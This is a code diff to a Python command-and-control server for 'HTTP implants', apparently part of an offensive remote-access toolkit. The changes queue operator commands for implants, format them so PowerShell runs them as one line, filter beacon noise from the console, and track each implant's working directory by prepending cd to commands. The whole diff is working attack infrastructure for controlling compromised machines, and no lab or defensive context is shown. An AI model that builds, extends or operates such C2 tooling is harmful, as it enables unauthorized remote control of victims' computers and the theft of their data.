@@ -6,6 +6,7 @@ import threading
 import sys
 import time
 import re
+import os
 from select import select
 
 # --- Configuration ---
@@ -38,7 +39,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         path = self.path.strip("/")
         with global_lock:
             if uid not in http_sessions:
-                http_sessions[uid] = {"last_cmd": "None", "output": "", "last_seen": time.time()}
+                http_sessions[uid] = {"last_cmd": "", "output": "", "last_seen": time.time(), "cwd": None}
                 sys.stdout.write(f"\r[+] New HTTP implant registered: {uid}\nC2 > ")
                 sys.stdout.flush()
             http_sessions[uid]["last_seen"] = time.time()
@@ -50,9 +51,10 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             command_fetch_path = parts[1]
             if path == command_fetch_path:
                 with global_lock:
-                    cmd = http_sessions[uid].get("last_cmd", "None")
-                    http_sessions[uid]["last_cmd"] = "None"
-                self.wfile.write(cmd.encode())
+                    cmd = http_sessions[uid].get("last_cmd", "")
+                    http_sessions[uid]["last_cmd"] = ""
+                # Send newline so PowerShell treats combined commands as a full line
+                self.wfile.write((cmd + "\n").encode())
                 return
             elif path == beacon_path:
                 self.wfile.write(b"OK")
@@ -80,8 +82,10 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 http_sessions[uid]["output"] = decoded_output
                 http_sessions[uid]["last_seen"] = time.time()
                 if current_session == ('http', uid):
-                    sys.stdout.write(f"\r{decoded_output.strip()}\nC2 > ")
-                    sys.stdout.flush()
+                    clean = decoded_output.strip()
+                    if clean and clean != "OK":
+                        sys.stdout.write(f"\r{clean}\nC2 > ")
+                        sys.stdout.flush()
 
         self._set_headers()
         self.wfile.write(b"OK")
@@ -241,7 +245,29 @@ def c2_console():
                 uid = current_session[1]
                 with global_lock:
                     if uid in http_sessions:
-                        http_sessions[uid]['last_cmd'] = cmd_input
+                        if cmd_input.startswith("cd"):
+                            parts = cmd_input.split(maxsplit=1)
+                            if len(parts) == 1:
+                                http_sessions[uid]['cwd'] = None
+                            else:
+                                arg = parts[1].strip()
+                                if ((arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'"))):
+                                    arg = arg[1:-1]
+                                current_cwd = http_sessions[uid].get('cwd')
+                                is_absolute = bool(re.match(r'^[A-Za-z]:[\\\\/]', arg)) or arg.startswith('/') or arg.startswith('\\\\')
+                                if is_absolute or not current_cwd:
+                                    new_dir = arg
+                                else:
+                                    sep = '\\\\' if ('\\\\' in current_cwd or re.match(r'^[A-Za-z]:', current_cwd)) else '/'
+                                    if current_cwd.endswith(sep):
+                                        new_dir = f"{current_cwd}{arg}"
+                                    else:
+                                        new_dir = f"{current_cwd}{sep}{arg}"
+                                http_sessions[uid]['cwd'] = new_dir
+                        else:
+                            cwd = http_sessions[uid].get('cwd')
+                            to_send = f'cd "{cwd}"; {cmd_input}' if cwd else cmd_input
+                            http_sessions[uid]['last_cmd'] = to_send
                     else:
                         print(f"[!] HTTP implant {uid} is no longer active.")
                         current_session = None
